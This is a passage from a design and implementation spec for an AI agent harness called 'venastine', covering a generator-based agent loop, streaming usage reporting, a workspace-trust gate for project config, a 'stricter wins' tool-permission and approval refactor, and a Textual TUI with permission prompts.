
        if max_total_tokens is not None and total_tokens_used >= max_total_tokens:
            response.stop_reason = "token_budget_exceeded"
            yield LoopEvent(final_response=response, stop_reason=response.stop_reason)
            return  # correctly gated -- budget genuinely exceeded

        if not response.tool_calls:
            response.stop_reason = "complete"
            yield LoopEvent(final_response=response, stop_reason=response.stop_reason)
            return  # correctly gated -- task genuinely complete

        for call in response.tool_calls:
            yield LoopEvent(tool_call_start={"id": call.id, "name": call.name, "input": call.input})

            if allowed_tools is not None and call.name not in allowed_tools:
                result = {"error": f"{call.name} is not available in this context"}
            else:
                needs_approval = requires_approval(call.name, call.input)  # "stricter wins" -- see §15
                if needs_approval:
                    yield LoopEvent(permission_request={"tool_name": call.name, "params": call.input})
                    approved = permission_channel.get() if permission_channel is not None else False
                    if not approved:
                        result = {"error": f"{call.name} requires approval and was not given"}
                    else:
                        result = registry.dispatch(call.name, call.input)
                else:
                    try:
                        result = registry.dispatch(call.name, call.input)
                    except ToolCallDenied as e:
                        result = {"error": str(e)}

            yield LoopEvent(tool_result={"id": call.id, "result": result})
            memory.add_tool_result(call.id, result)
        # loop continues to next iteration -- NOT gated by a yield/return here

    # max_steps exhausted without an earlier return
    response.stop_reason = "max_steps_reached"
    yield LoopEvent(final_response=response, stop_reason=response.stop_reason)
```

`run_to_completion(gen)` lives in **`core/loop.py`, not a separate module** (settling Rev. 1's own open question, S16) — it's tightly coupled to `_run()`'s exact generator shape and has no reason to live anywhere else; placing it elsewhere risked a circular import (C8) for no benefit.

```python
def run_to_completion(gen) -> ModelResponse:
    """Consumes a _run() generator fully, discarding intermediate events,
    and returns the final ModelResponse -- this is what keeps
    run_agent_conversation()/run_deep_research_mode() backward compatible
    with every existing caller."""
    final = None
    for event in gen:
        if event.final_response is not None:
            final = event.final_response
    return final
```

**(Rev. 3, correction)** There are **three** public wrappers calling `_run()`, not two. Rev. 2 named `run_agent_conversation()` and `run_deep_research_mode()` and missed **`continue_conversation()`** (`core/loop.py:139-169`) — which is the one that matters most to the rest of this document, because it is the entry point ROADMAP §3's JSON-retry uses to send a corrective follow-up into an existing thread, and §21 builds its compaction-retry loop on that same mechanism. All three become thin wrappers: build the generator, pass it to `run_to_completion()`, return the result. Their public signatures are unchanged.

Missing it would not have been subtle at runtime — each wrapper does `response.thread_id = ...` on the return value, and generator objects reject attribute assignment, so it fails with `AttributeError: 'generator' object has no attribute 'thread_id'` on first use. It would, however, have been missed by anyone working section-by-section from the file list, which is the actual risk: §21 depends on a retry path this document never mentioned converting.

### `core/client.py` changes

`call_model_stream()` is a new generator-based sibling to `call_model()`, yielding token-level events from the underlying SDK's streaming API for each provider. `collect_response(gen)` (a small helper, analogous to `run_to_completion`) drains it into a single `ModelResponse` for any caller that doesn't need streaming.

**(Rev. 3) This is three implementations, not one, and it is the largest under-estimate in Rev. 2.** `call_model()` is ~100 lines across three branches — `ANTHROPIC`, `GOOGLE`, and an OpenAI-compatible path that every other provider in `providers.json` routes through via `is_v1_compatible`. Each branch reads tool calls and usage out of a different response shape, and each streams differently: Anthropic emits typed events (`content_block_delta`, with usage split across `message_start` and `message_delta`), Google yields chunked candidates, and the OpenAI path yields choice deltas whose `tool_calls` arrive as *fragments that must be accumulated by index* rather than as complete objects. `call_model_stream()` must produce a `ModelResponse` identical to what `call_model()` produces for the same inputs, per provider — treat that equivalence as the acceptance bar, not "tokens appear."

**Usage reporting in streaming mode is a verified trap (D21).** Three separate facts compound:

1. **OpenAI-compatible streaming returns no usage at all** unless the request sends `stream_options={"include_usage": True}`. With it, usage arrives on one extra final chunk whose `choices` array is empty, and is `null` on every earlier chunk.
2. **Not every v1-compatible provider accepts that parameter.** Mistral rejects it with HTTP 422 `extra_forbidden` — and `MISTRAL` is in this project's own supported-provider list in `providers.json.example`. So it cannot simply be sent unconditionally on the shared OpenAI-compatible path; it needs a per-provider capability flag in `providers.json` (`supports_stream_usage`, defaulting conservatively), which is the same shape as the existing `is_v1_compatible` flag.
3. **Every usage read in `core/client.py` is a defensive `getattr(usage_obj, "...", 0)`.** Missing usage therefore does not raise — it reports zero.

Together those mean a plausible first implementation of streaming makes `total_tokens_used` stay at 0 forever, which silently disables the `max_total_tokens` stop condition and, later, §21's entire compaction trigger — with no error, no warning, and correct-looking output. Per D21, `collect_response()` raises when a stream completes without usage data on a provider marked as supporting it, rather than passing zeros through. If the stream is interrupted or cancelled the final usage chunk may never arrive, so that path must be distinguishable from "provider doesn't report usage."

### Acceptance criteria

1. `run_to_completion(RunAgentLoop._run(...))` produces byte-for-byte the same `ModelResponse` the current non-generator `_run()` produces, for the same inputs — this is the regression test that would have caught Rev. 1's yield/return placement bug had it shipped as written.
2. A multi-turn scenario (tool call → result → follow-up call → final answer) yields events in the correct order and does NOT terminate early.
3. All three stop conditions (complete, budget exceeded, max_steps) each yield exactly one terminal event with the correct `stop_reason`.
4. **Every existing test that calls `RunAgentLoop._run()` directly (not through the public wrapper methods) is updated to wrap the call in `run_to_completion()`.** **(Rev. 3, verified — the count was flagged in Rev. 2 as unconfirmed and is now confirmed by AST-walking the suite.)** The "8 tests" estimate was correct. The exact inventory, so this doesn't need re-deriving:

   | File | Test function |
   |---|---|
   | `tests/test_loop_stop_conditions.py` | `test_stop_condition_1_task_complete_no_tool_calls` |
   | `tests/test_loop_stop_conditions.py` | `test_stop_condition_2_max_steps_call_count_equals_max_steps` |
   | `tests/test_loop_stop_conditions.py` | `test_stop_condition_3_token_budget_exceeded_first_call` |
   | `tests/test_loop_tool_dispatch.py` | `test_single_tool_call_dispatches_and_feeds_result_to_memory` |
   | `tests/test_loop_tool_dispatch.py` | `test_two_tool_calls_in_one_response_dispatch_each_in_order` |
   | `tests/test_loop_tool_dispatch.py` | `test_disallowed_tool_name_skips_dispatch_and_feeds_error_result` |
   | `tests/test_loop_tool_dispatch.py` | `test_registry_dispatch_raises_ToolCallDenied_caught_and_recorded_as_error` |
   | `tests/test_loop_tool_dispatch.py` | `test_allowed_tools_none_permits_every_tool` |

   8 test functions, 8 call sites in tests, plus 3 production call sites in `core/loop.py` (the three wrappers above) — 11 total. `tests/test_json_retry.py` references `_run()` heavily in comments but calls it only through `run_deep_research_mode`/`continue_conversation`, so it needs no edit for this, though see criterion 6. Both affected test modules build kwargs through a helper (`_make_run_kwargs` / `_build_run_inputs`), so `_run()` gaining `permission_channel` and `tool_context` does not break them — only the generator conversion does. `tests/BREAKING_CHANGES.md` §68 already anticipates this and should be updated alongside.
5. A mid-loop exception (e.g. a tool raising an unexpected error) propagates out of the generator to the caller, unchanged from current non-streaming behavior.
6. **(Rev. 3, D20) A persistence-ordering regression test that inspects `MessageLog`, not the return value.** After a run ending in a plain-text answer, and after a run cut short by `token_budget_exceeded`, the thread's persisted history must contain that final assistant turn. Criterion 1 (byte-for-byte identical `ModelResponse`) passes even when this is broken, which is exactly why Rev. 2's sketch shipped the regression unnoticed — the returned object is correct and only the database is wrong. `tests/test_memory_write_through.py` is the natural home.
7. **(Rev. 3, D21) A streaming run reports non-zero token usage on every provider marked as supporting usage reporting**, and a provider not marked as supporting it never receives `stream_options`. Assert on `total_tokens_used` advancing, not just on the response body — a budget silently pinned at 0 is the failure this is guarding.

---

## 14. File syntax + config loader — YAML frontmatter + `.md` discovery + workspace trust

### File discovery locations (three tiers, per D8/D18)

```
agents/builtin/*.md, skills/builtin/*.md   # shipped WITH the harness; never overridden by anything (D18)
.venastine/agents/*.md, .venastine/skills/*.md   # project-level; requires workspace trust (D17)
.venastine/settings.json                    # project-level structured settings; requires workspace trust
.venastine/CONTEXT.md                       # project-level free-text context; requires workspace trust
.venastine/mcp.json                         # project-level MCP server config; requires workspace trust
~/.config/venastine/agents/*.md, skills/*.md, settings.json, mcp.json   # user-level; always trusted (you authored it)
```

**Discovery precedence:** harness → project (only if trusted) → user. A name collision AT THE HARNESS TIER is rejected outright with a warning — not silently shadowed — per D18. A name collision between project and user tiers still resolves project-wins, per the original D8 (this is a much lower-stakes case since neither can impersonate a built-in). **AMENDED BY D29 (§17): user beats project**, for agents, skills and MCP servers alike -- "project" does not mean "more specific", it means "it arrived with a directory you cloned", so the tier you merely trusted once must not silently displace the one you authored. `settings.json` deliberately keeps project-over-user, because its values are shown verbatim in the trust prompt and consented to directly.

### Workspace trust (new, D17)

```python
# core/workspace_trust.py

import hashlib
import json
import os

TRUST_STORE_PATH = os.path.expanduser("~/.config/venastine/trusted_projects.json")

def _content_hash(project_venastine_dir: str) -> str:
    """Hashes the concatenated content of every file under .venastine/ in
    a project -- agents, skills, settings.json, CONTEXT.md, mcp.json.
    Changed content after trust was granted produces a different hash,
    which re-triggers the prompt rather than silently inheriting stale trust.

    (Rev. 3) Two corrections to the obvious implementation, both of which
    matter because this hash is a security control rather than a cache key:

      1. `os.walk` yields subdirectories in filesystem order, not sorted
         order. Sorting `files` alone is not enough -- `dirs` must be
         sorted IN PLACE so os.walk itself descends deterministically,
         or the same unchanged .venastine/ can hash differently between
         runs and re-prompt for trust that was already granted. Users who
         are re-prompted for no visible reason learn to approve without
         reading, which defeats the control entirely.
      2. Hashing file CONTENT only means the path is invisible to the
         hash. Two files swapping names, or a file moving between
         agents/ and skills/, produces an identical digest -- and the
         directory a definition lives in is what determines how it's
         loaded. Feed the relative path in too, with a separator, so
         concatenation boundaries can't be forged."""
    hasher = hashlib.sha256()
    for root, dirs, files in os.walk(project_venastine_dir):
        dirs.sort()   # deterministic descent -- see (1)
        for fname in sorted(files):
            path = os.path.join(root, fname)
            rel = os.path.relpath(path, project_venastine_dir)
            hasher.update(rel.encode("utf-8"))
            hasher.update(b"\0")
            with open(path, "rb") as f:
                hasher.update(f.read())
            hasher.update(b"\0")
    return hasher.hexdigest()

def is_trusted(project_path: str) -> bool:
    resolved = os.path.realpath(project_path)
    venastine_dir = os.path.join(resolved, ".venastine")
    if not os.path.isdir(venastine_dir):
        return True  # nothing to trust -- no project-level content at all
    current_hash = _content_hash(venastine_dir)
    store = _load_trust_store()
    return store.get(resolved) == current_hash

def grant_trust(project_path: str) -> None:
    resolved = os.path.realpath(project_path)
    venastine_dir = os.path.join(resolved, ".venastine")
    store = _load_trust_store()
    store[resolved] = _content_hash(venastine_dir)
    _save_trust_store(store)

def _load_trust_store() -> dict:
    if not os.path.exists(TRUST_STORE_PATH):
        return {}
    with open(TRUST_STORE_PATH, "r") as f:
        return json.load(f)

def _save_trust_store(store: dict) -> None:
    os.makedirs(os.path.dirname(TRUST_STORE_PATH), exist_ok=True)
    with open(TRUST_STORE_PATH, "w") as f:
        json.dump(store, f, indent=2)
```

**Until trust is granted, project-level `.venastine/` content does not load at all** — agents, skills, `CONTEXT.md`, and `mcp.json` servers are all absent, not loaded-but-disabled. No partial trust. This gate applies uniformly to every kind of project-level content, including `CONTEXT.md` — a project's free-text context is exactly as capable of prompt-injecting a system prompt as an agent file is, and should not be treated as exempt just because it's not technically an "agent."

### New file: `core/config_loader.py`

Discovers and parses every `.md` file across the three tiers, applying the trust gate to the project tier before even attempting to read it. YAML frontmatter parsing must use a **line-anchored delimiter match**, not a raw substring search:

```python
import re

_FRONTMATTER_DELIM = re.compile(r"^---\s*$", re.MULTILINE)

def _parse_frontmatter(text: str) -> tuple[dict, str]:
    """
    Returns (frontmatter_dict, body). Uses a delimiter that must occupy
    its own line -- NOT text.find("---"), which matches the first bare
    '---' anywhere in the file, including a markdown horizontal rule
    inside the body itself (a very common convention in longer
    instructional content, which is exactly what agent/skill bodies are).
    This was a real, easily-triggered bug in the original draft, not a
    rare edge case.
    """
    matches = list(_FRONTMATTER_DELIM.finditer(text))
    if len(matches) < 2:
        raise ValueError("No valid YAML frontmatter block found (need two '---' lines)")
    frontmatter_text = text[matches[0].end():matches[1].start()]
    body = text[matches[1].end():].strip()
    return yaml.safe_load(frontmatter_text), body
```

### `.venastine/settings.json` (structured, project-level, replaces Rev. 1's `config.md` settings fields)

```json
{
  "default_provider": "ANTHROPIC",
  "default_model": "claude-sonnet-5",
  "ensemble_mode": false,
  "compaction": {
    "strength": 3,
    "keep_recent_tokens": 4000,
    "buffer_tokens": 8000,
    "warning_margin_tokens": 2000
  }
}
```

Every key is optional; anything absent falls through to the next tier (D27's resolution order). Compaction values are nested under their own object rather than flattened, so the `COMPACTION_*` family stays visibly one concern as it grows.

### `.venastine/CONTEXT.md` (free text, project-level, replaces Rev. 1's `config.md` notes field)

Plain markdown, no frontmatter needed — this file IS its own content, the same relationship AGENTS.md/QWEN.md have to their respective tools. Injected into an agent's system prompt only if that agent's frontmatter declares `use_project_context: true` — this is opt-in per agent, not automatic for every call, so a simple lookup doesn't pay the token cost of a project summary it doesn't need.

### Agent `.md` file format

```markdown
---
name: security-reviewer
description: Reviews code and research output for security issues
model: claude-sonnet-5
provider: ANTHROPIC
allowed_tools: [read, web_search, symbolic_math]
approval_overrides:
  shell: false      # NOTE: per D14 "stricter wins," this does NOT disable
                    # shell's own approval_check -- both are consulted and
                    # the stricter result applies. See §15.
use_project_context: true
use_memory: true
max_steps: 15
---

## Methodology

You are a security-focused reviewer...
```

### Skill `.md` file format

```markdown
---
name: cybersecurity-research
description: Domain conventions for cybersecurity research tasks
additional_tools: [arxiv_search]
---

## Cybersecurity Research Methodology

When researching vulnerabilities...
```

### `requirements.txt` addition

`pyyaml` (pin explicitly, even if already a transitive dependency).

### Acceptance criteria

1. An untrusted project directory's `.venastine/` content does not load at all — no agents, no skills, no `CONTEXT.md`, no MCP servers — until `grant_trust()` has been called for it.
2. Modifying any file under a previously-trusted project's `.venastine/` changes the content hash and causes `is_trusted()` to return `False` again.
3. A harness-tier agent/skill name collision with a project or user file is rejected with a warning at load time, and the harness-tier version is what actually gets used.
4. A markdown body containing a bare `---` horizontal rule parses correctly (regression test for the frontmatter delimiter bug).
5. `use_project_context: false` (or omitted) means `CONTEXT.md` is never read for that agent's calls, even if trusted and present.

---

## 15. Permission system refactor — "stricter wins" + dynamic tool registration

### New: `ToolContext` dataclass (`tools/context.py`)

```python
from dataclasses import dataclass, field
from typing import Optional

@dataclass
class ToolContext:
    allowed_tools: Optional[set[str]] = None       # None = no restriction from this layer
    approval_overrides: dict[str, bool] = field(default_factory=dict)
    subagent_depth: int = 0                         # see §18 -- threaded through spawn_subagent
```

### The governing rule: "stricter wins" (D14)

Every check consults **every currently active layer** — global `config.ToolPermissions`/`ToolApprovals`, the active agent's `ToolContext` (if any), every active skill's tool additions/overrides (if any), and the tool's own dynamic `approval_check` (if the `ToolSpec` defines one). There is no precedence order between layers in the sense of one overriding another — instead:

- **Allow/deny (`is_tool_allowed`): logical AND across every layer.** A tool is available only if the global policy allows it AND it's within every active agent/skill's `allowed_tools` restriction (when one is declared). A tool disabled globally can never be re-enabled by an agent or skill — that check happens first, unconditionally, before any context is even considered.
- **Approval (`requires_approval`): logical OR across every layer.** Approval is required if the global/tool-level check says so, OR if the active agent's `approval_overrides` says so. **Critically, this includes a tool's own `approval_check` callable** (e.g. `file_ops`'s path-dependent check) — an agent's `approval_overrides` can make a tool require approval it otherwise wouldn't, but it can never make an otherwise-gated tool skip approval `approval_check` itself would still require. This resolves a real gap found during review: the current `dispatch()` lets a tool's `approval_check` bypass the generic `requires_approval()` entirely when present, which would have made agent-level `approval_overrides` silently do nothing for `read`/`write`/`edit`/`shell` — the four tools where per-agent customization matters most.

```python
def is_tool_allowed(tool_name: str, context: Optional[ToolContext] = None) -> bool:
    permissions = config.ToolPermissions()
    if not getattr(permissions, tool_name, _default_for_unknown_tool(tool_name)):
        return False
    if context and context.allowed_tools is not None and tool_name not in context.allowed_tools:
        return False
    return True

def requires_approval(tool_name: str, params: dict, context: Optional[ToolContext] = None) -> bool:
    approvals = config.ToolApprovals()
    tool_level = getattr(approvals, tool_name, False)
    context_level = context.approval_overrides.get(tool_name, False) if context else False
    return tool_level or context_level   # OR, not either/or -- both are always consulted
```

**`tools/registry.py`'s `dispatch()` changes:** the existing `approval_check` precedence (checking the tool's own dynamic callable) is preserved, but its result is now **OR'd with** the context-aware `requires_approval()` result, not used as a full bypass:

```python
def dispatch(self, tool_name, params, context=None, approval_callback=None):
    # (Rev. 3, correction) The unknown-tool guard and the check_output_policy
    # call below are PRESERVED from the current implementation, not new.
    # Rev. 2's sketch of this function omitted both. Written as sketched, it
    # would have deleted ROADMAP §8's secret-redaction layer outright -- in
    # the section whose entire subject is tightening permissions -- and
    # turned an unknown tool name from a clean ValueError into a KeyError.
    # The guard matters MORE now than it did before, not less: MCP tools are
    # registered at runtime and unregistered when a server disconnects, so
    # "this name was valid two minutes ago" becomes a reachable state
    # rather than a programming error.
    if tool_name not in self._tools:
        raise ValueError(f"Unknown tool: {tool_name}")

    if not is_tool_allowed(tool_name, context):
        raise ToolCallDenied(f"{tool_name} is disabled by policy")

    spec = self._tools[tool_name]

    tool_level_approval = (
        spec.approval_check(tool_name, params)
        if spec.approval_check is not None
        else False
    )
    needs_approval = tool_level_approval or requires_approval(tool_name, params, context)

    if needs_approval:
        approved = approval_callback(tool_name, params) if approval_callback else False
        if not approved:
            raise ToolCallDenied(f"{tool_name} requires approval and was not given")

    result = spec.handler(params)
    result = check_output_policy(tool_name, result)   # PRESERVED -- ROADMAP §8
    return result
```

**General rule this incident produces (see "Why," below):** where a section of this document restates an existing function in order to change part of it, the restatement is not a specification of the whole function. Diff it against the real implementation before treating it as complete. Rev. 2 made this mistake twice in code sketches (here and §13's persist ordering) and once in prose (§13's two-of-three wrapper list), which is enough of a pattern to name.

### Dynamically-named tools (MCP), and why the static dataclass model needed a fallback

`config.ToolPermissions`/`ToolApprovals` are static dataclasses with one hardcoded boolean field per known tool name. MCP tools are named dynamically at connection time (`mcp__<server>__<tool>`) and can never have a pre-declared field. `getattr(permissions, tool_name, False)` — the current pattern — would silently deny every MCP tool by default, permanently, outside of an agent context that happens to declare it in `allowed_tools`. `_default_for_unknown_tool(tool_name)` resolves this explicitly rather than leaving it to an accidental `getattr` default:

```python
def _default_for_unknown_tool(tool_name: str) -> bool:
    """Dynamically-registered tools (MCP, currently) get an explicit,
    named default rather than silently inheriting getattr's fallback.
    Default: MCP tools are allowed by default (their own server-level
    trust gate, per §17, is the actual control point), everything else
    unknown is denied by default."""
    if tool_name.startswith("mcp__"):
        return True
    return False
```

### Live bug found while specifying the above: `fetch_url` has never been callable (Rev. 3, D24)

Making omission *meaningful* for MCP tools surfaced a case where omission was *accidental* for a built-in one. `fetch_url` is registered in `tools/registry.py`, documented as Working in ARCHITECTURE.md §423, and enforced against the blocked-domain list per DEVLOG §8 — but it has no field in `config.ToolPermissions`. `getattr(permissions, "fetch_url", False)` therefore returns `False`, and `dispatch()` has been raising `ToolCallDenied("fetch_url is disabled by policy")` for every call since the tool was added. It is absent from `ToolApprovals` too. Verified by executing the real check against all 14 registered tools; `fetch_url` is the only one affected.

The failure mode is quiet in a specific way worth noting: the tool's schema is still advertised to the model on every call, so the model keeps choosing it, and the only trace is a denial string inside a tool result the model then works around. Nothing logs, nothing raises, and the deep-research pipeline's grounding passes lose a source-fetching capability the architecture assumes they have.

Two changes, and the second is the one that matters:

1. Add `fetch_url` to both `ToolPermissions` and `ToolApprovals`. **Confirm the intended defaults first** — `web_search: True` suggests `fetch_url: True` was intended, but it fetches arbitrary URLs, so `approvals.fetch_url` is a real decision rather than a copy of its neighbour.
2. **Add an import-time consistency check** that every name in `registry._tools` has a declared field in both dataclasses, raising on mismatch. Without it, the same defect recurs the next time a tool is added — and this is the second time this exact shape has occurred in this file (ARCHITECTURE.md §441 records the first: a registry that imported five tools and registered one). A gap that recurs is a missing invariant, not a mistake.

The check must run *after* MCP registration is understood to be exempt: dynamically-named `mcp__*` tools are covered by `_default_for_unknown_tool()` by design, so the assertion applies to statically-registered tools only.

### Acceptance criteria

1. A globally-disabled tool cannot be re-enabled by any agent or skill context — verified with a test that sets `config.ToolPermissions().shell = False` and an agent context that explicitly allows `shell`.
2. An agent's `approval_overrides` requiring approval for a normally-auto-approved tool (e.g. `symbolic_math`) is honored — an agent CAN tighten a lenient default, this is a real, intended capability, not just a restriction.
3. An agent's `approval_overrides: {shell: false}` does NOT suppress `shell`'s own path/command-dependent `approval_check` — this is the specific regression test for the gap found during review.
4. An MCP tool (name starting `mcp__`) is available by default with no agent context active, rather than being silently denied.
5. **(Rev. 3) `check_output_policy()` still runs on every dispatched tool result after the refactor** — assert directly that a handler returning a string containing a recognized secret pattern comes back redacted. `tests/test_policy_enforcement.py` has the patterns already; this criterion exists because the refactor sketch dropped the call, so "it still works" needs to be proven rather than assumed.
6. **(Rev. 3, D24) Every statically registered tool has a field in both `ToolPermissions` and `ToolApprovals`** — a test that walks `registry._tools` and asserts `hasattr` on both, which fails today on `fetch_url` and is the regression guard afterward.
7. **(Rev. 3) `dispatch()` on an unregistered name raises `ValueError`, not `KeyError`** — including after an MCP server has been unregistered mid-session, which is the realistic trigger.

---

### Built

Implemented as specified, with four deliberate deviations and one correction to this section's own sketch. Full decision record in DEVLOG.md §15.

**All seven acceptance criteria pass** (`tests/test_permission_context.py`, 21 tests). Suite: 272 → 307.

**Deviations from the sketch above, each user-approved before implementation:**

1. **The approval OR-composition lives in `ToolRegistry.approval_needed()`, not inlined in `dispatch()`.** The `dispatch()` sketch above was written against pre-§13 code and does not mention `approval_needed()` — which §13 introduced precisely as the single source of truth shared by `dispatch()` AND `_run()`'s permission bridge (ARCHITECTURE §4.8). Implemented literally, `dispatch()` would have gained stricter-wins while the loop's bridge kept the old `approval_check`-as-full-bypass behaviour, so an agent's `approval_overrides` would be honoured on one code path and silently ignored on the other. **This is this document's own "an abbreviated restatement of existing code is a proposal to delete whatever it abbreviates" rule (see *Why these calls*) applying to §15 one revision after it was written down** — the sketch is correct about the composition and stale about where it belongs.

2. **`_run()`'s `allowed_tools` parameter is replaced by `context`, not kept alongside it.** The two expressed the same restriction at different layers, and §18's own sketch passes the same set through both channels (`ToolContext(allowed_tools=child_allowed)` *and* `run_agent_conversation(..., allowed_tools=child_allowed)`). `_run()` no longer performs a membership check of its own; `is_tool_allowed(name, context)` inside `dispatch()` covers it. The three public wrappers gained a `context=None` kwarg so §18 does not have to reopen their signatures.

3. **`registry.schemas()` filters by policy** — not specified here at all. The `fetch_url` defect's entire damage was that the schema stayed advertised while the call was denied, so the model kept choosing it and burning a turn per attempt. Fixing the instance without the shape would leave `read`/`write`/`edit` (all permission `False` by default) doing exactly the same thing. Advertised tools under default config: 10 of 15 registered. **Note for §19:** this makes the staleness item in *Lower-priority items* live sooner — schemas are still computed once at the top of `_run()`, so a skill activated mid-session will not appear until the next turn.

4. **`dispatch()` distinguishes two denial causes** — "not available in this context" vs "disabled by policy". A context restriction is something the model can route around by choosing another tool; a global denial is not. The pre-§15 loop produced the first message from its own membership check, so collapsing both into one string would have been a regression disguised as consolidation.

**`fetch_url` defaults (the confirmation this section asks for):** permission `True`, approval `False`. Approval `True` would leave it unusable wherever there is no `permission_channel` to answer the prompt — the CLI chat loop and every research pass — which is the same outcome as the D24 bug with a different error string. It remains constrained by `policy_enforcement`'s blocked-domain list, and its output goes through secret redaction like every other tool's.

**D24 check placement:** the helper is `security.permissions.assert_permissions_declared()`, called from the bottom of `tools/registry.py` after the static registrations. It lives in `permissions.py` because that file owns knowledge of the dataclasses, and is *called* from `registry.py` because `permissions.py` must not import the registry — the dependency runs `tools -> security`, one way. Verified live, not just unit-tested: deleting `ToolPermissions.fetch_url` makes `import tools.registry` raise.

**`unregister()`** ships here (D15 assigns it to this section and AC7's stated trigger cannot be exercised without it). Idempotent — disconnect handling can run more than once for the same server. §17 only has to call it.

**Also fixed in this cycle** — five findings from the §14 review, which had been tested but never reviewed: unhandled config errors reaching the user as a traceback; `compaction` settings replacing rather than deep-merging across tiers; silent same-tier name collisions; the frontmatter block not being anchored to the start of file; and `load_skill` being advertised with an empty catalog (solved via a new `ToolSpec.available_check`, keeping skill knowledge out of the registry). See DEVLOG §15.4.

---

## 16. TUI — Textual app + widgets + slash commands + streaming integration

**This section was rewritten during implementation, because it could not be built from what it said.** Rev. 3 described §16 as "Unchanged from Rev. 1 in overall shape" and made acceptance criterion 1 "All Rev. 1 acceptance criteria" — but Rev. 1's text no longer exists anywhere in this repository; Revision 3 overwrote it. What survived was a one-line gloss (Textual app, `ModalScreen` for thread picker / permission prompts, slash command registry, `run_worker(thread=True)`) plus two Rev. 3 corrections. The baseline TUI — layout, widget set, slash-command surface, mode toggle — was unspecified.

**The general lesson, and it is a different one from Rev. 3's "abbreviated restatement" rule:** a section that defers to another *document revision* rather than to another *section* has a dangling reference the moment that revision is replaced. Cross-references by section number survive revisions (that is why this document says section numbers are stable); cross-references to "Rev. 1" do not. Where a section is genuinely unchanged, restate its acceptance criteria rather than pointing at a revision that will be overwritten.

### Scope: the shell, not the capabilities

§16 ships a complete, polished TUI **shell**. Capabilities land in the section that owns them and register into the shell.

This is forced by D12, which makes the CLI a permanent fallback that is never removed. A capability implemented inside `tui/` is invisible to the CLI *and* to the research pipeline — so a question tool, a todo list, or a goal mode written here would be a feature only one of three entry points can use. The shell hosts; it does not own.

### Components

- `tui/app.py` — the `App`. Event routing, the worker, slash-command dispatch, both ravens.
- `tui/widgets.py` — transcript (with Rich `Syntax` highlighting for fenced code), raven panels, research progress.
- `tui/commands.py` — the slash-command registry. Mechanism only; §18/§19/§21 register into it, exactly as `tools/registry.py` holds dispatch mechanics while `security/permissions.py` holds policy.
- `tui/screens.py` — `ModalScreen`s for the permission prompt and the thread picker.
- `tui/themes.py` — eight themes (dark/light × plain/red/green/blue).
- `tui/ravens.py` — mascot art and the activity-state table.

### Streaming and the permission bridge (fixes C1)

`_run()` is already a generator yielding `LoopEvent` (§13), and `permission_channel` already exists, so the app needs no new loop machinery:

```python
def run_agent_turn(self, user_input: str):
    channel = queue.Queue()
    generator = RunAgentLoop._run(..., permission_channel=channel)
    self.run_worker(lambda: self._consume(generator),
                    thread=True, exit_on_error=False)

def _consume(self, generator):
    for event in generator:
        self.post_message(LoopEventMessage(event))   # thread-safe hand-off
```

The worker thread blocks inside `_run()` on `permission_channel.get()`; the UI thread shows the modal and puts the decision on the queue. **Nothing re-enters or restarts the generator** — that is what AC2 asserts, and it asserts it against the dispatched tool rather than against the modal appearing, because a modal that renders and then drops the answer leaves the worker blocked forever. That failure presents as a hang, not as an error.

**Every dismissal path must produce a boolean.** Escape, and any dismissal carrying `None`, resolve to a denial. A `None` reaching `channel.put()` would unblock the worker with a non-answer; a dismissal that puts nothing at all never unblocks it.

### Worker error handling (verified, not assumed)

An exception inside a `thread=True` worker does not propagate to the caller of `run_worker()`. Textual catches it, moves the worker to `WorkerState.ERROR`, and exposes it on `event.worker.error`. **`exit_on_error` defaults to `True`**, so an unhandled transient network error would terminate the whole app. `exit_on_error=False` plus an `on_worker_state_changed` handler are both required.

Confirmed against textual 1.0.0's real signature during implementation rather than assumed: `run_worker` takes `exit_on_error` and `thread`, and `Worker.StateChanged` / `WorkerState.ERROR` exist as described.

### The two ravens

**Corner raven — activity.** Driven entirely by the `LoopEvent` stream already flowing to the UI: `token_delta` → thinking, `tool_call_start` → a per-tool state (searching / reading / editing / running), `permission_request` → waiting, `final_response` → idle. **Unknown tool names map to a generic working state**, so §17's runtime-registered MCP tools and §18's subagents animate without the table being edited.

**Small raven — reasoning effort.** Renders the current level so the setting is visible rather than remembered.

**Animation must not compete with token streaming.** A redraw loop running against incoming deltas is the one place the mascot costs responsiveness rather than merely effort; animation pauses while a stream is active, and `tui.animations` disables it outright.

### Reasoning-effort switching

`core/client.py` gains `_thinking_for_provider()` alongside `_tools_for_provider()` / `_messages_for_provider()` — the same translate-at-the-boundary case. The three providers do not share a concept:

| Provider | Shape | Valid values |
|---|---|---|
| Anthropic | `output_config.effort` + `thinking: {type: "adaptive"}` | Enum, **queryable** per model via `capabilities.effort` on the Models API |
| OpenAI-compatible | `reasoning_effort` | Enum, reasoning models only; no capability endpoint on any provider in `providers.json` |
| Google | `thinking_config.thinking_budget` | An **integer budget**, not an enum at all |

So `effort_levels_for_model()` queries Anthropic and tabulates the rest — a newly released Anthropic model needs no entry anywhere in this repo, which is the whole reason to query rather than tabulate uniformly. Falling back logs at WARNING, matching §21's `MODEL_CONTEXT_WINDOWS` posture.

**Effort is opt-in (`None` sends nothing).** This is load-bearing, not a default chosen for tidiness: `reasoning_effort` is rejected by OpenAI-compatible *non-reasoning* models, and `thinking: {type: "adaptive"}` is rejected by pre-4.6 Anthropic models. Silence is the only universally safe value, so every pre-§16 caller behaves exactly as before.

**`config.MAX_TOKENS` was raised from 4096.** On current Anthropic models `max_tokens` caps thinking **plus** response text together, so the old value truncated answers mid-sentence the moment effort was enabled. Shipping the picker without this would have shipped a feature that breaks the thing it attaches to.

### Prerequisite fixed here: ensemble mode could not run

`orchestrator.py` passed `temperature=config.ENSEMBLE_TEMPERATURE` into `call_model`, and current Anthropic models reject sampling parameters — removed outright on Opus 5 / 4.8 / 4.7 and Fable 5, non-default values rejected on Sonnet 5, which is `config.MODEL_NAME`'s default. ROADMAP §10 was built, documented as working, and **could not execute against this harness's own default model**. It never surfaced because `ENSEMBLE_MODE = False`, and §14 shipped the first convenient way to turn it on.

Two changes: `call_model`/`call_model_stream` omit sampling parameters where the model rejects them, and the orchestrator **refuses** to run ensemble mode on such a model. Refusing rather than silently dropping the parameter is the point — dropping it would generate `ensemble_n` identical candidates, spend N× the tokens, and then report maximal cross-candidate consistency for every claim, feeding a falsely confident score into Pass 4. Redesigning §10's diversity mechanism was a deferred **§10 revisit**.

